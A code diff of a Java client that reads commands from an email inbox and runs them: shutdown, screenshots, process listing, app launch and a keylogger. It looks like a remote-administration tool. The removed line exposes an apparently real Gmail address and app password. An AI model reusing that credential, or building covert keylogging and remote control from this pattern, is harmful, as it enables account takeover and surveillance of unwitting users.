@@ -4,6 +4,8 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -52,13 +54,12 @@ public class Client {
         }
 
         private void processEmailCommands() throws Exception {
-            ReceiveMail mailReceived = new ReceiveMail("imap.gmail.com", "pvhoangnamzz@gmail.com", "drzd dpmu evff ejqj");
+            ReceiveMail mailReceived = new ReceiveMail();
             List<CustomPair<String, String>> commands = mailReceived.getRequirements();
-
             for (CustomPair<String, String> cmd : commands) {
                 String[] choice = cmd.getValue().split("&&");
                 String from = cmd.getKey();
-                System.out.println(choice);
+//                System.out.println(choice);
 
                 switch (choice[0].toLowerCase()) {
                     case "shutdown":
@@ -72,9 +73,11 @@ public class Client {
                         break;
                     case "screenshot":
                         ScreenShot.requestScreenshot(socket, writer, reader, from);
+//                        new ReceiveMail().getAttachments(App.user);
                         break;
                     case "listprocess":
                         HandleProcess.requestListProcess(socket, writer, from);
+//                        new ReceiveMail().getAttachments(App.user);
                         break;
                     case "startapp":
                         HandleProcess.requestStartApp(socket, writer, choice[1], from);
@@ -98,8 +101,8 @@ public class Client {
                         KeyLogger.stopKeylogger(from);
                         break;
                     default:
-                        System.out.println("Something went wrong!");
-                        throw new AssertionError();
+                        System.out.println("Command not found");
+//                        throw new AssertionError();
                 }
             }
         }
